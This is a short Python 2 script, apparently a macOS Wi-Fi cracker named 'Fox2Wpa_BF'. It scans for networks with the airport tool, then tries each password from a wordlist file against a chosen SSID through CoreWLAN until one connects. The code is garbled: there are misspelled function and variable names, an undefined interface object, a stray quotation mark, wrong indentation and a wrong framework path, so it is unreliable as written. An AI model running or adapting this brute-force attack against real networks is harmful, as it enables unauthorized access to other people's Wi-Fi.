"""
Made by Misty;
KISA KUCIS SeaHawk

CopyRight by 2019(a)

"""

# Major Lib import
import objc
import subprocess

print "######################################"
print "#      Fox2Wpa_BF {Wifi-cracker}     #"
print "#                                    #"
print "#              Made By Misty; KISA   #"
print "# CopyRight By 2019(alpa)            #"
print "######################################"

Fox_bashCommand = '/System/Library/PrivateFrameworks/Apple802.framework/Version/Current/Resources/airport -s'
subprocess.call(Fox_bashCommend.split())

SSID = imput('Select Your SSID from the above list : ')

objc.loadBundle('CoreWLAN', bundle_path = '/System/Library/Frameworks/CoreWLAN.framework', module_globals = globals())
networks, error = iface.scanForNetworksWithName_error_(str(SSID.strip()), None)
network = networks.any0Object()

count = 0
with open('/Users/Download/WIFI_LIST.txt', 'r') as wifi_pwd:
  for line in with_pwd.readlines():
    count +=1
    print "[*] ", "Trying with this pwd : {}".format(str(line))"
    pwd = str(line.strip())
    sucess, error = iface.assosciateToNetwork_password_error_(network, pw, None)
    if Success == 1:
    print "[+] ", "Found Wifi password!", "The password is... : ", str(line)
    print "[*] ", "{} times tried to hack this ssid network.".format(count)
    break
    
    
if __name__ == "__main__":
  print "[!] ", "If this code active, This script will be excute well."
else:
  print "[-] ", "Critical Error occured. please contact with script developer!"
  
     
